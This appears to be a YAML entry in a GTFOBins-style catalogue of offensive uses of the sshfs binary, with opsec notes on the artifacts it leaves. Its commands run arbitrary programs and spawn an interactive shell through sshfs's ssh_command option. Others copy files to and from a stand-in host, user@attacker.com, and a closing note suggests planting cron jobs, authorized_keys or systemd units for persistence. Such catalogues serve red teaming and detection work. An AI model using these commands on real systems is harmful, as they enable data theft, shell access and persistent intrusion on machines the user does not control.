---
name: sshfs
capabilities:
- exec
- spawn
- upload
- download
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  - Outbound network traffic to attacker host
  notes: ''
persistence_potential: true
examples:
- id: command
  description: Execute an arbitrary command.
  capabilities:
  - exec
  command: 'sshfs -o ssh_command=/path/to/command x: /path/to/dir/'
- id: download
  description: Fetch a remote file to disk.
  capabilities:
  - download
  command: |-
    sshfs user@attacker.com:/ /path/to/dir/
    cp /path/to/dir/path/to/input-file /path/to/output-file
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    echo -e '/bin/sh </dev/tty >/dev/tty 2>/dev/tty' >/path/to/temp-file
    chmod +x /path/to/temp-file
    sshfs -o ssh_command=/path/to/temp-file x: /path/to/dir/
  notes: The mount dir must be writable by the invoking user.
- id: upload
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: |-
    sshfs user@attacker.com:/ /path/to/dir/
    cp /path/to/input-file /path/to/dir/
references:
- https://gtfobins.github.io/gtfobins/sshfs/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
